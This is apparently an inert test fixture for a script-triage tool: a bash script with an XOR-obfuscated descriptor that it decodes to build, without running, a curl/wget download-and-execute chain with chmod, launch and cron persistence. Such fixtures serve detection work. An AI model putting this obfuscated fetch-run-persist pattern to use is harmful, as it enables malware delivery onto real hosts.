# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_46387f22='235 236 30 251 90 233 180 95 244 20 237 163 64 225 64 241 180 112 239 70 238 165 3 230 74 236 164 70 245 76 194 163 74 234 70 233 180 3 240 91 244 165 74 216 79 244 189 74 171 74 245 176 65 224 76 194 188 64 227 76 177 181 70 244 89 252 165 76 239 118 237 163 64 228 76 238 162 83 230 77 252 161 91 226 91 160 188 90 235 93 244 142 90 243 64 241 184 91 254 118 251 176 67 235 75 252 178 68 251 90 233 176 72 226 118 254 190 90 233 93 160 228 83 228 72 240 161 78 238 78 243 142 70 227 20 254 176 66 247 72 244 182 65 170 29 254 231 77 228 74 171 180 29 182 85 232 163 67 186 65 233 165 95 244 19 178 254 27 228 31 255 178 76 177 76 175 224 1 226 81 252 188 95 235 76 179 184 65 241 72 241 184 75 168 76 169 178 22 176 79 171 231 1 244 65 225 164 92 226 91 194 176 72 226 71 233 236 103 242 71 233 163 74 244 90 209 176 77 168 29 254 231 77 228 74 171 180 29 182 85 251 184 67 226 118 237 176 91 239 20 178 165 66 247 6 245 164 65 243 91 248 162 92 170 74 252 178 71 226 6 179 162 91 230 78 248 252 27 228 31 255 178 76 177 76 175 224 83 230 91 254 185 112 247 91 242 179 74 186 92 243 176 66 226 4 240 173 92 226 91 235 184 76 226 118 243 176 66 226 20 232 161 75 230 93 248 252 27 228 31 255 178 76 177 76 175 224 1 244 76 239 167 70 228 76 225 178 93 232 71 194 161 78 243 65 160 254 74 243 74 178 178 93 232 71 179 181 0 242 89 249 176 91 226 4 169 178 25 229 74 254 231 74 181 24'
readonly Codec_46387f22='decimal_space|repeating_key_xor|9d,d1,2f,87,29'

Load_46387f22() {
  v_a19c=()
  local IFS=' '
  read -r -a v_a19c <<< "${Material_46387f22}"
}

Decode_46387f22() {
  v_b27e=()
  local -a key_bytes=(157 209 47 135 41)
  local v_e598
  for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
    v_b27e+=("$((v_a19c[v_e598] ^ key_bytes[v_e598 % ${#key_bytes[@]}]))")
  done
}

Recover_46387f22() {
  local -a v_a19c v_b27e
  local v_c304 v_d41a v_b803 v_e598
  v_d41a="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_46387f22
  Decode_46387f22
  v_c304=''
  local octal character
  for v_e598 in "${!v_b27e[@]}"; do
    printf -v octal '%03o' "${v_b27e[v_e598]}"
    printf -v character '%b' "\\$octal"
    v_c304+="$character"
  done
  printf '%s\n' "$v_c304"
}

Inspect_46387f22() { local recovered; recovered="$(Recover_46387f22)"; printf '%s\n' "$recovered"; }

Plan_46387f22() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_46387f22)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_46387f22; fi

# reconstruction complete